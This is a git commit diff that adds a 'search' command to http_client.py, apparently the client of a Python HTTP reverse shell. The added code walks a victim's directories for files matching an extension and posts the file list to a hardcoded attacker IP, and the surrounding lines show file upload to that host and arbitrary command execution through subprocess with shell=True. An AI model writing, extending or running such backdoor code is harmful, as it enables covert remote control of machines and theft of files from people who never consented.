d05e75e1275d22d544eb84d17fc1241943214259
Michael Kirori <kirorikamau@yaoo.com>
2016-11-09 10:09:13 -0500

    Add file search functionality

--- http_client.py
+++ http_client.py
@@ -33,6 +33,19 @@ while True:
         r = requests.post(url, files=files)
         files['file'].close()
         shutil.rmtree(tmppath)
+
+    elif 'search' in command:
+        #Search command will take the formart "search C:\\*.pdf" i.e. you start by specifying the directory to search in followed by the file extension
+        command = command[7:]
+        path, ext = command.split('*')
+
+        list = ''
+
+        for dirpath, dirname, files in os.walk(path):
+            for file in files:
+                if file.endswith(ext):
+                    list = list + '\n' + os.path.join(dirpath, file)
+        requests.post(url = 'http://192.168.233.128', data=list)
         
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
